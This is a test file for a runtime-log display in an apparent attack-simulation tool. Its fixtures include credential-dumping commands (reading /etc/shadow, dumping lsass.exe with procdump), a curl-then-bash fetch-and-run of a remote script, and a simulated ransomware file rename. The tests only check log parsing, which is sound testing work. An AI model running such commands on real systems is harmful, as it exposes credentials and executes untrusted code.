/**
 * The runtime log while a run is live, and what it keeps apart from the steps.
 *
 *   - a command's one-line preview leads with the first line that does
 *     something, not the scratch-folder set-up;
 *   - output streamed while a step runs shows in that step's block, and the
 *     step's stored frame replaces it (never both);
 *   - the beacon's `=== CLEANUP` section is its own block, with the outcome
 *     `Run.cleanup` records;
 *   - launch lines the run page states as a notice are not repeated in the log.
 */
import { describe, it, expect } from 'vitest'
import { buildRuntimeLog, commandLead } from '../runtimeLog.js'

const STEPS = [
  { id: 'step-01', name: 'Read the shadow file', command: 'cat /etc/shadow', identity: 'root', mitre_technique: 'T1003.008' },
  { id: 'step-02', name: 'Dump the process', command: 'gcore -o /tmp/dump 1', identity: 'www-data', mitre_technique: 'T1003.007' },
]
const BLOCK_1 = [
  '=== STEP 1/2 · step-01 · T1003.008 · identity=root ===',
  'root:$6$abc:19000:0:99999:7:::',
  '--- exit_code=0 duration=1.2s ---',
]
const BLOCK_2 = [
  '=== STEP 2/2 · step-02 · T1003.007 · identity=www-data ===',
  'gcore: ok',
  '--- exit_code=0 duration=310ms ---',
]
const CLEANUP = [
  '=== CLEANUP · 3 commands · identity=direct ===',
  '$ rm -rf /tmp/cortexsim-edr001',
  '--- cleanup 1/3 exit_code=0 duration=4ms ---',
  '$ systemctl disable --now cortexsim-demo.service',
  'Failed to disable unit: Unit file cortexsim-demo.service does not exist.',
  '--- cleanup 2/3 exit_code=1 duration=12ms ---',
  '$ userdel svc-demo',
  '--- cleanup 3/3 exit_code=0 duration=9ms ---',
]

describe('commandLead — the line a command preview shows', () => {
  const POSIX = `C=$(mktemp -d /tmp/cortexsim.XXXXXX) || exit 1; trap 'rm -rf "$C"' EXIT`

  it('skips the scratch-folder line when more lines follow', () => {
    expect(commandLead(`${POSIX}\ncurl -sS https://example.test/a.sh -o "$C/a.sh"\nbash "$C/a.sh"`))
      .toBe('curl -sS https://example.test/a.sh -o "$C/a.sh"')
  })

  it('leads with what follows the scratch-folder set-up on the same line', () => {
    expect(commandLead(`${POSIX}; curl -sS https://example.test/a.sh -o "$C/a.sh"`))
      .toBe('curl -sS https://example.test/a.sh -o "$C/a.sh"')
  })

  it('skips the lines that make, or check, a folder several steps share', () => {
    const make = [
      'rm -rf /tmp/cortexsim-edr-008 && mkdir -m 700 /tmp/cortexsim-edr-008 || { echo "sandbox /tmp/cortexsim-edr-008 could not be created fresh: something else is at that path" >&2; exit 1; }',
      'VDIR=/tmp/cortexsim_victim; rm -rf "$VDIR" && mkdir -m 700 "$VDIR" || { echo "sandbox $VDIR could not be created fresh: something else is at that path" >&2; exit 1; }',
      'for i in $(seq 1 40); do echo "original content $i" > $VDIR/document_$i.dat; done',
    ].join('\n')
    expect(commandLead(make)).toBe('for i in $(seq 1 40); do echo "original content $i" > $VDIR/document_$i.dat; done')
    const check = [
      '[ "$(stat -c %F:%u:%a /tmp/cortexsim-edr-008 2>/dev/null)" = "directory:$(id -u):700" ] || { echo "sandbox /tmp/cortexsim-edr-008 is missing or not ours: step-01 did not complete" >&2; exit 1; }',
      '# Rewrite every victim file with the .cortexlock extension.',
      'while read -r f; do',
      '  printf SAFE > "${f}.cortexlock" && rm -f "$f"',
      'done < /tmp/cortexsim-edr-008/cortexsim_targetlist.txt',
    ].join('\n')
    expect(commandLead(check)).toBe('while read -r f; do')
  })

  it('skips the Windows scratch-folder block and its comments', () => {
    const windows = [
      "$sandbox = Join-Path $env:TEMP 'cortexsim-edr006'",
      '# Whatever is at the path goes, then the folder is made with its ACL in one call.',
      'if (Test-Path -LiteralPath $sandbox) { cmd.exe /c rmdir /s /q "$sandbox" }',
      '$me = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value',
      '$sd = New-Object System.Security.AccessControl.DirectorySecurity',
      '$sd.SetSecurityDescriptorSddlForm("D:P(A;OICI;FA;;;SY)", [System.Security.AccessControl.AccessControlSections]::Access)',
      '$null = [System.IO.Directory]::CreateDirectory($sandbox, $sd)',
      '$acl = Get-Acl -LiteralPath $sandbox -ErrorAction SilentlyContinue',
      '$ids = if ($acl) { @($acl.GetAccessRules($true, $true, [System.Security.Principal.SecurityIdentifier])) } else { @() }',
      'if (-not ($acl -and $acl.AreAccessRulesProtected)) { Write-Error "sandbox $sandbox could not be created fresh: something else is at that path"; exit 1 }',
      'if (Get-ChildItem -LiteralPath $sandbox -Force) { Write-Error "sandbox $sandbox is not empty: something else is at that path"; exit 1 }',
      "$dmp = Join-Path $sandbox 'lsass.dmp'",
      '& procdump64.exe -accepteula -ma lsass.exe $dmp',
    ].join('\n')
    expect(commandLead(windows)).toBe("$dmp = Join-Path $sandbox 'lsass.dmp'")
  })

  it('a command that is only the set-up, or has none, shows its first line', () => {
    expect(commandLead(POSIX)).toBe(POSIX)
    expect(commandLead('cat /etc/shadow')).toBe('cat /etc/shadow')
    expect(commandLead('for f in a b; do\n  echo "$f"\ndone')).toBe('for f in a b; do')
  })
})

describe('output while a step runs', () => {
  const running = {
    status: 'running', mode: 'pull', delivered_at: '2026-11-15T10:00:03',
    output: BLOCK_1.join('\n'),
    step_outcomes: [{ step_id: 'step-01', termination: 'exited', rc: 0 }],
    step_starts: [
      { step_id: 'step-01', command: 'cat /etc/shadow' },
      { step_id: 'step-02', command: 'gcore -o /tmp/dump 1' },
    ],
  }

  it('shows in the running step, under the command the agent reported', () => {
    const log = buildRuntimeLog({ steps: STEPS, run: running, live: { 'step-02': 'attaching to pid 1\nwriting core\n' } })
    const two = log.blocks[1]
    expect(two.state.word).toBe('Running')
    expect(two).toMatchObject({ command: 'gcore -o /tmp/dump 1', commandFrom: 'agent', live: true })
    expect(two.lines).toEqual(['attaching to pid 1', 'writing core'])
  })

  it('is replaced by the stored frame once the step has ended', () => {
    const run = { ...running, output: [...BLOCK_1, ...BLOCK_2].join('\n') }
    const log = buildRuntimeLog({ steps: STEPS, run, live: { 'step-02': 'attaching to pid 1\nwriting core\n' } })
    expect(log.blocks[1].state.word).toBe('Ran')
    expect(log.blocks[1].lines).toEqual(['gcore: ok'])
    expect(log.blocks[1].live).toBe(false)
  })

  it('a step that started and has not ended reads Running with its command', () => {
    const log = buildRuntimeLog({ steps: STEPS, run: running })
    expect(log.blocks.map((b) => b.state.word)).toEqual(['Ran', 'Running'])
    expect(log.blocks[1].command).toBe('gcore -o /tmp/dump 1')
    expect(log.blocks[1].lines).toEqual([])
  })
})

describe('the cleanup section is its own block, after the steps', () => {
  const base = {
    status: 'complete', mode: 'pull', delivered_at: '2026-11-15T10:00:03',
    step_outcomes: [
      { step_id: 'step-01', termination: 'exited', rc: 0 },
      { step_id: 'step-02', termination: 'exited', rc: 0 },
    ],
  }
  const withSection = [...BLOCK_1, ...BLOCK_2, ...CLEANUP].join('\n')
  const entry = (over) => [{ agent_id: 'ag-1', task_id: 't-1', commands: 3, status: 'clean', ran: 3, failed: 0, reason: null, ...over }]

  it('is not left under the last step', () => {
    const log = buildRuntimeLog({ steps: STEPS, run: { ...base, output: withSection, cleanup: entry({ status: 'failed', failed: 1, reason: 'COMMAND_FAILED' }) } })
    expect(log.blocks[1].notes).toEqual([])
    expect(log.blocks[1].lines).toEqual(['gcore: ok'])
  })

  it('says "1 of 3 failed", with each command, its output and its exit', () => {
    const log = buildRuntimeLog({ steps: STEPS, run: { ...base, output: withSection, cleanup: entry({ status: 'failed', failed: 1, reason: 'COMMAND_FAILED' }) } })
    expect(log.cleanup.state).toMatchObject({ key: 'failed', status: 'down', word: '1 of 3 failed' })
    expect(log.cleanup.commands.map((c) => c.command)).toEqual([
      'rm -rf /tmp/cortexsim-edr001', 'systemctl disable --now cortexsim-demo.service', 'userdel svc-demo',
    ])
    expect(log.cleanup.commands[1]).toMatchObject({
      exit: 1, duration: '12ms',
      lines: ['Failed to disable unit: Unit file cortexsim-demo.service does not exist.'],
    })
  })

  it('says Clean when every command ran clean', () => {
    const clean = CLEANUP.map((l) => l.replace('exit_code=1', 'exit_code=0'))
    const log = buildRuntimeLog({ steps: STEPS, run: { ...base, output: [...BLOCK_1, ...BLOCK_2, ...clean].join('\n'), cleanup: entry() } })
    expect(log.cleanup.state).toMatchObject({ key: 'clean', status: 'up', word: 'Clean' })
  })

  it('says Not run, with the reason as the host gave it', () => {
    const log = buildRuntimeLog({
      steps: STEPS,
      run: { ...base, status: 'failed', output: '', step_outcomes: [], cleanup: entry({ status: 'not_run', ran: 0, reason: 'NO_STEP_STARTED' }) },
      cleanupCommands: ['rm -rf /tmp/cortexsim-edr001'],
    })
    expect(log.cleanup.state).toMatchObject({ key: 'not_run', status: 'off', word: 'Not run' })
    expect(log.cleanup.reason).toBe('no step started')
    // No section was written, so the commands shown are the scenario's own.
    expect(log.cleanup.commands.map((c) => c.command)).toEqual(['rm -rf /tmp/cortexsim-edr001'])
  })

  it('keeps a reason it does not know as the text it was given', () => {
    const log = buildRuntimeLog({ steps: STEPS, run: { ...base, output: withSection, cleanup: entry({ status: 'failed', failed: 1, reason: '<b>disk full</b>' }) } })
    expect(log.cleanup.reason).toBe('<b>disk full</b>')
  })

  it('says Pending while the run is live, and Not run once it ended unreported', () => {
    const pending = entry({ status: 'pending', ran: 0 })
    const live = buildRuntimeLog({ steps: STEPS, run: { ...base, status: 'running', output: BLOCK_1.join('\n'), cleanup: pending } })
    expect(live.cleanup.state).toMatchObject({ key: 'pending', word: 'Pending' })
    const ended = buildRuntimeLog({ steps: STEPS, run: { ...base, output: [...BLOCK_1, ...BLOCK_2].join('\n'), cleanup: pending } })
    expect(ended.cleanup.state).toMatchObject({ key: 'not_run', word: 'Not run' })
    expect(ended.cleanup.reason).toBe('not reported')
  })

  it('a run that carries no cleanup has no cleanup block', () => {
    const log = buildRuntimeLog({ steps: STEPS, run: { ...base, output: [...BLOCK_1, ...BLOCK_2].join('\n'), cleanup: null } })
    expect(log.cleanup).toBeNull()
  })
})

describe('launch lines the run page states as a notice', () => {
  it('are not repeated as lines of the log', () => {
    const output = [
      "!! RUNTIME_DEPENDENCY_GAP: agent 'ag-1'; steps step-02; The agent did not report python3, and the beacon will not run these steps without it.",
      "!! CLEANUP_NOT_RUN: agent 'ag-1'; this beacon does not run scenario cleanup; update it, or clean the host by hand after the run",
      '!! TARGET_AGENT_OS_UNKNOWN: the target agent registered no operating system',
      '!! PLATFORM VARIANT: step=step-02 ran its windows variant',
      ...BLOCK_1,
    ].join('\n')
    const log = buildRuntimeLog({ steps: STEPS, run: { status: 'running', output } })
    expect(log.preface.flat()).toEqual(['!! PLATFORM VARIANT: step=step-02 ran its windows variant'])
  })
})
